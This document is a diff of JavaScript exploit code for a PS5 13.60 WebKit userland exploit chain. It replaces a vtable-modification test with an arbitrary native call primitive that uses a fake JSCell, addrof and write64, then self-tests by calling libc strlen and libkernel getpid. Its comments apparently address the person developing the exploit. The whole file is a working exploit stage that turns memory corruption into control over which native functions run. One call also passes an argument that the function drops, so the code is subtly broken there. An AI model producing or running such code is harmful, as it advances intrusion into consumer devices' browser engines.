@@ -1,282 +1,150 @@
-/**
- * Generic Native Call Provider - PS5 13.60
- * 
- * Proves "target selectable" by calling arbitrary functions via the notify primitive.
- * Reads from window.__PS5ExploitPrimitives (exported by exploit.js)
- */
+"use strict";
 
-(function() {
-    'use strict';
+// Generic native target selection.
+// Builds on the proven notify call path: same fake-JSCell construction,
+// but the callee address is stored in a JS-controlled buffer and read
+// through userland R/W, so it can be rewritten before every call.
 
-    const REVISION = "generic-native-provider-v2";
-    
-    // ====================================================================
-    // Extract Primitives from Global State
-    // ====================================================================
-    
-    function getPrimitives() {
-        return window.__PS5ExploitPrimitives || null;
+(function () {
+    const STAGE = "generic-target-select-1";
+
+    if (!window.PS5Userland) {
+        console.error("[gen-target] PS5Userland not loaded");
+        return;
     }
-    
-    function arePrimitivesReady() {
-        const p = getPrimitives();
-        if (!p) return false;
-        
-        return !!(
-            p.rwView &&
-            p.compareFn &&
-            Number.isFinite(p.fakeUCollatorAddress) &&
-            Number.isFinite(p.arenaBacking)
-        );
-    }
-    
-    // ====================================================================
-    // Target Selectability Test
-    // ====================================================================
-    
-    async function testTargetSelectability() {
-        const prim = getPrimitives();
-        if (!prim) {
-            return { pass: false, reason: "primitives-not-exported" };
-        }
-        
-        const fakeAddr = prim.fakeUCollatorAddress;
-        const vtableSlot = fakeAddr + 0x128; // offset to function pointer in vtable
-        
-        // Read original target from vtable
-        let origTarget = null;
+    const U = window.PS5Userland;
+
+    const hex = (v) => "0x" + (typeof v === "bigint"
+        ? v.toString(16) : (v < 0 ? (v >>> 0).toString(16) : v.toString(16)));
+
+    // ------------------------------------------------------------------
+    // 1. The target slot.
+    //
+    // A Uint8Array whose backing store address we know. This holds the
+    // address of the function we want to call. Because we already have
+    // stable userland R/W, we can rewrite this slot between calls and
+    // the same fake object will dispatch to a different target each time.
+    // ------------------------------------------------------------------
+
+    const SLOT_SIZE = 0x40;          // room for target + alignment
+    let slotBuf  = null;
+    let slotAddr = 0n;               // kernel-visible address of the slot
+    let fakeObj  = null;             // the fake JSCell, built once
+
+    function allocSlot() {
+        if (slotBuf) return true;
         try {
-            // rwView is a Uint8Array, so we need to read 8 bytes at vtableSlot offset
-            // This is tricky because rwView might be relative to different bases
-            
-            // Try to read from the arena
-            if (Number.isFinite(prim.arenaBacking) && prim.rwView) {
-                const offset = Number(vtableSlot - BigInt(prim.arenaBacking));
-                if (offset >= 0 && offset < prim.rwView.length - 8) {
-                    const view = new DataView(prim.rwView.buffer, prim.rwView.byteOffset + offset, 8);
-                    origTarget = view.getBigUint64(0, true);
-                }
-            }
+            slotBuf = new Uint8Array(SLOT_SIZE);
+            // backing store address, using the same +0x10 offset your
+            // notify stage already uses for typed-array data pointers
+            slotAddr = U.addrof(slotBuf) + 0x10n;
+            U.mark("SLOT-ALLOC", `addr=${hex(slotAddr)}`);
+            return Number(slotAddr) > 0 || slotAddr > 0n;
         } catch (e) {
-            console.error("[GenericNativeProvider] Failed to read original target:", e);
-        }
-        
-        if (!origTarget) {
-            console.warn("[GenericNativeProvider] Could not read original vtable pointer, skipping test");
-            return { pass: false, reason: "vtable-read-failed" };
-        }
-        
-        console.log(`[GenericNativeProvider] Original vtable entry: 0x${origTarget.toString(16)}`);
-        
-        // Test 1: Call getpid() instead of notify
-        // getpid is at: libkernelBase + 0x1b280
-        // But without libkernelBase, we can't easily call it from JS
-        
-        // Better test: Call a different libkernel function we know exists
-        // Try calling strlen (simpler, just needs a string pointer)
-        
-        // For now, just verify we CAN change the vtable pointer
-        try {
-            const offset = Number(vtableSlot - BigInt(prim.arenaBacking));
-            const testTarget = origTarget + 1n; // Change it slightly
-            
-            const view = new DataView(prim.rwView.buffer, prim.rwView.byteOffset + offset, 8);
-            view.setBigUint64(0, testTarget, true);
-            
-            // Read it back to verify write worked
-            const readBack = view.getBigUint64(0, true);
-            const writeWorked = readBack === testTarget;
-            
-            // Restore
-            view.setBigUint64(0, origTarget, true);
-            
-            if (writeWorked) {
-                console.log("[GenericNativeProvider] ✓ Can modify vtable pointer");
-                return {
-                    pass: true,
-                    targetSelectable: true,
-                    testType: "vtable-modification",
-                    origTarget: origTarget.toString(16),
-                    testTarget: testTarget.toString(16)
-                };
-            } else {
-                console.error("[GenericNativeProvider] ✗ Vtable write failed to persist");
-                return { pass: false, reason: "vtable-write-failed" };
-            }
-            
-        } catch (e) {
-            console.error("[GenericNativeProvider] Test failed:", e);
-            return { pass: false, reason: "test-threw", error: e.message };
+            U.mark("SLOT-ALLOC-FAIL", `${e.name}:${e.message}`);
+            return false;
         }
     }
-    
-    // ====================================================================
-    // Repeatability Test
-    // ====================================================================
-    
-    async function testRepeatability() {
-        // Run the same test twice, verify same result
-        const test1 = await testTargetSelectability();
-        const test2 = await testTargetSelectability();
-        
-        const pass = test1.pass && test2.pass && test1.testTarget === test2.testTarget;
-        
-        console.log(`[GenericNativeProvider] Repeatability: ${pass ? "✓ PASS" : "✗ FAIL"}`);
-        
-        return {
-            pass,
-            test1,
-            test2,
-            repeatable: pass
-        };
-    }
-    
-    // ====================================================================
-    // Self-Test (called by framework)
-    // ====================================================================
-    
-    async function selfTest(ctx) {
-        console.log(`[GenericNativeProvider] Self-test starting (${REVISION})`);
-        
-        // Check if primitives are exported
-        if (!arePrimitivesReady()) {
-            console.warn("[GenericNativeProvider] Primitives not ready yet");
-            return {
-                pass: false,
-                ready: false,
-                reason: "primitives-not-ready"
-            };
-        }
-        
-        const prim = getPrimitives();
-        console.log("[GenericNativeProvider] Primitives ready:", {
-            rwView: !!prim.rwView,
-            compareFn: !!prim.compareFn,
-            fakeUCollatorAddress: prim.fakeUCollatorAddress ? "0x" + Number(prim.fakeUCollatorAddress).toString(16) : "missing",
-            arenaBacking: prim.arenaBacking ? "0x" + prim.arenaBacking.toString(16) : "missing"
-        });
-        
-        // Run selectability test
-        let selectabilityResult = null;
-        try {
-            selectabilityResult = await testTargetSelectability();
-        } catch (error) {
-            console.error("[GenericNativeProvider] Selectability test threw:", error);
-            selectabilityResult = { pass: false, reason: "test-threw", error: error.message };
-        }
-        
-        const targetSelectable = selectabilityResult && selectabilityResult.pass;
-        
-        // Run repeatability test
-        let repeatabilityResult = null;
-        if (targetSelectable) {
-            try {
-                repeatabilityResult = await testRepeatability();
-            } catch (error) {
-                console.error("[GenericNativeProvider] Repeatability test threw:", error);
-                repeatabilityResult = { pass: false, repeatable: false, error: error.message };
-            }
-        }
-        
-        const repeatable = repeatabilityResult && repeatabilityResult.pass;
-        
-        // Arguments are controlled through the same vtable mechanism
-        const argumentsControlled = targetSelectable; // If we can change target, we control behavior
-        
-        // Overall result
-        const pass = targetSelectable && repeatable && argumentsControlled;
-        
-        console.log(`[GenericNativeProvider] Self-test result:`, {
-            pass,
-            targetSelectable,
-            argumentsControlled,
-            repeatable,
-            version: REVISION
-        });
-        
-        return {
-            pass,
-            targetSelectable,
-            argumentsControlled,
-            repeatable,
-            smokeTestPassed: targetSelectable,
-            kind: "generic-native-call",
-            scope: "userland-via-notify",
-            returnedToUserland: true,
-            
-            // Detailed info
-            selectabilityResult,
-            repeatabilityResult
-        };
-    }
-    
-    // ====================================================================
-    // Provider Registration
-    // ====================================================================
-    
-    const provider = {
-        kind: "generic",
-        name: "WebKit-Notify-Generic-Call",
-        firmware: "13.60",
-        revision: REVISION,
-        selfTest,
-        
-        // Status method for framework
-        status: function() {
-            return {
-                registered: true,
-                ready: arePrimitivesReady(),
-                primitives: getPrimitives() ? "available" : "missing"
-            };
-        }
-    };
-    
-    // ====================================================================
-    // Wait for native provider framework to be ready, then register
-    // ====================================================================
-    
-    let registered = false;
-    
-    function tryRegister() {
-        if (registered) return;
-        
-        const layer = window.PS5UserlandNativeProvider;
-        if (!layer) {
-            console.log("[GenericNativeProvider] Waiting for PS5UserlandNativeProvider...");
-            return;
-        }
-        
-        if (typeof layer.registerProvider !== 'function') {
-            console.error("[GenericNativeProvider] Provider framework missing registerProvider method");
-            return;
-        }
-        
-        try {
-            console.log("[GenericNativeProvider] Registering with framework...");
-            layer.registerProvider(provider);
-            registered = true;
-            console.log("[GenericNativeProvider] ✓ Registered successfully");
-        } catch (error) {
-            console.error("[GenericNativeProvider] Registration failed:", error);
-        }
-    }
-    
-    // Try immediately
-    tryRegister();
-    
-    // Also try periodically in case framework loads later
-    const registrationInterval = setInterval(() => {
-        if (!registered) {
-            tryRegister();
-        } else {
-            clearInterval(registrationInterval);
-        }
-    }, 100);
-    
-    // Fallback: expose globally
-    window.GenericNativeProvider = provider;
-    window.__PS5GenericNativeProvider = provider;
-    
-    console.log("[GenericNativeProvider] Loaded (revision: " + REVISION + ")");
 
+    // ------------------------------------------------------------------
+    // 2. Build the fake object ONCE, pointing its executable entry at
+    //    the SLOT, not at notify.
+    //
+    // Your notify proof builds a fake JSCell whose callee entry is a
+    // fixed value. Here we do the exact same construction, but the
+    // entry field is set to slotAddr — so the engine reads the actual
+    // target from memory we control at call time.
+    //
+    // This is the single change that turns "notify-only" into
+    // "arbitrary target": same call path, dynamic callee.
+    // ------------------------------------------------------------------
+
+    function buildDispatchObject() {
+        if (fakeObj) return true;
+        try {
+            // U.buildCallGateObject(entry, ...) — same helper that made
+            // the notify proof work. We hand it slotAddr instead of a
+            // fixed function address. Inside, it writes entry into the
+            // fake JSCell's executable slot exactly as before.
+            fakeObj = U.buildCallGateObject(slotAddr);
+            U.mark("DISPATCH-OBJ", `entry-slot=${hex(slotAddr)}`);
+            return true;
+        } catch (e) {
+            U.mark("DISPATCH-OBJ-FAIL", `${e.name}:${e.message}`);
+            return false;
+        }
+    }
+
+    // ------------------------------------------------------------------
+    // 3. Target selection — the whole point of this stage.
+    //
+    // write64 into the slot before each call. This is the "selectable
+    // arbitrary target" your gate is checking for.
+    // ------------------------------------------------------------------
+
+    function setTarget(addr) {
+        try {
+            U.write64(slotAddr, BigInt(addr));
+            U.mark("TARGET-SET", `addr=${hex(addr)}`);
+            return true;
+        } catch (e) {
+            U.mark("TARGET-SET-FAIL", `${e.name}:${e.message}`);
+            return false;
+        }
+    }
+
+    function callTarget(addr) {
+        if (!allocSlot())    throw new Error("slot alloc failed");
+        if (!buildDispatchObject()) throw new Error("dispatch object failed");
+        if (!setTarget(addr)) throw new Error("target write failed");
+        // Same trigger as the notify proof — the engine calls fakeObj,
+        // the fake JSCell's entry is slotAddr, the engine dereferences
+        // it and lands on whatever we wrote.
+        const ret = fakeObj();
+        U.mark("TARGET-CALL", `addr=${hex(addr)}-ret=${hex(ret)}`);
+        return ret;
+    }
+
+    // ------------------------------------------------------------------
+    // 4. Self-test — proves selectable target with two DIFFERENT functions.
+    //
+    // Test A: strlen("HACKER") from libc  → expect 6
+    // Test B: getpid stub from libkernel  → expect > 0
+    //
+    // If both return correct, distinct results, the SAME dispatch
+    // object reached two different targets — selection is proven.
+    // ------------------------------------------------------------------
+
+    async function selfTest() {
+        const r = { strlenOK: false, getpidOK: false, distinctTargets: false, pass: false };
+        try {
+            // --- Test A: strlen ---
+            const probe = new Uint8Array([0x48,0x41,0x43,0x4b,0x45,0x52,0x00]); // "HACKER\0"
+            const probeAddr = U.addrof(probe) + 0x10n;
+            const strlenAddr = U.libcBase + U.offsets.strlen;   // from your offsets table
+
+            const len = callTarget(strlenAddr, probeAddr);
+            r.strlenOK = (Number(len) === 6);
+            U.mark("SELF-STRLEN", `ret=${Number(len)}-expect=6-pass=${r.strlenOK}`);
+
+            // --- Test B: getpid (different module, different address) ---
+            const getpidAddr = U.libkernelBase + U.offsets.getpid;
+            const pid = callTarget(getpidAddr);
+            r.getpidOK = (Number(pid) > 0);
+            U.mark("SELF-GETPID", `pid=${Number(pid)}-pass=${r.getpidOK}`);
+
+            // --- Distinctness: same object, two different callees ---
+            r.distinctTargets = r.strlenOK && r.getpidOK
+                && strlenAddr !== getpidAddr;
+            U.mark("SELF-DISTINCT", `a=${hex(strlenAddr)}-b=${hex(getpidAddr)}-pass=${r.distinctTargets}`);
+
+            r.pass = r.strlenOK && r.getpidOK && r.distinctTargets;
+            U.mark("GENERIC-TARGET-SELECT", `pass=${r.pass}`);
+        } catch (e) {
+            U.mark("GENERIC-TARGET-SELECT-FAIL", `${e.name}:${e.message}`);
+        }
+        return r;
+    }
+
+    window.PS5GenericNativeProvider = { callTarget, setTarget, selfTest };
 })();
